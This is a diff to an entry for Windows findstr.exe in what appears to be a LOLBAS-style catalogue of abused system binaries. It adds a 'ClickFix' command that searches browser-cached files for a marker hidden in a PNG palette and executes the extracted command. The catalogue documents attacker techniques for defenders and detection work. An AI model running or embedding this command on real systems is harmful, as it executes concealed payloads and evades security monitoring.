@@ -32,6 +32,13 @@ Commands:
     Privileges: User
     MitreID: T1105
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+  - Command: cmd /c @for /r "%LOCALAPPDATA%" %f in (*) do @if %~zf gtr 400000 @for /f "delims=" %x in ('findstr "sSJ105" "%f"') do start "" /min cmd /v:on /c %x
+    Description: ClickFix technique that searches cached files over 400KB under %LOCALAPPDATA% for a marker string embedded in a PNG color palette, then executes the matched command.
+    Usecase: Execute commands hidden in browser-cached PNG images to evade detection
+    Category: Execute
+    Privileges: User
+    MitreID: T1059.003
+    OperatingSystem: Windows 10, Windows 11
 Full_Path:
   - Path: C:\Windows\System32\findstr.exe
   - Path: C:\Windows\SysWOW64\findstr.exe
@@ -40,6 +47,8 @@ Detection:
 Resources:
   - Link: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/
   - Link: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f
+  - Link: https://vega.io/blog/clickfix-png-palette-shell-commands
 Acknowledgement:
   - Person: Oddvar Moe
     Handle: '@oddvarmoe'
+  - Person: Daniel Messing
